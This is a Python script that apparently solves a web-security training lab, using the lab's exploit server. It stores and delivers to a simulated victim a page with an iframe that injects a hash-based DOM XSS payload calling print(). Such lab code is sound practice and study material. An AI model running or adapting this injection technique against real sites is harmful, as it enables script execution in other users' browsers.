import requests
import re
import sys

def find_exploit_url(content):
    match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', content)
    if match:
        return match.group(0)
    else:
        raise Exception("Zle url podales")

def main(target_url):
    response = requests.get(target_url)
    if response.status_code != 200:
        raise Exception(f"Failed")

    exploit_url = find_exploit_url(response.text)

    post_body_store = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
        'responseBody': f'<iframe src="{target_url}/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>',
        'formAction': 'STORE'
    }

    post_body_deliver = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
        'responseBody': f'<iframe src="{target_url}/#" onload="this.src+=\'<img src=x onerror=print()>\'"></iframe>',
        'formAction': 'DELIVER_TO_VICTIM'
    }

    store_response = requests.post(exploit_url, data=post_body_store)
    if store_response.status_code != 200:
        raise Exception(f"Failed")

    deliver_response = requests.post(exploit_url, data=post_body_deliver)
    if deliver_response.status_code != 200:
        raise Exception(f"Failed")

    final_response = requests.get(f"{exploit_url}/deliver-to-victim")
    if final_response.status_code != 200:
        raise Exception(f"Failed")

    print("Exploit sequence executed successfully")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    main(target_url)
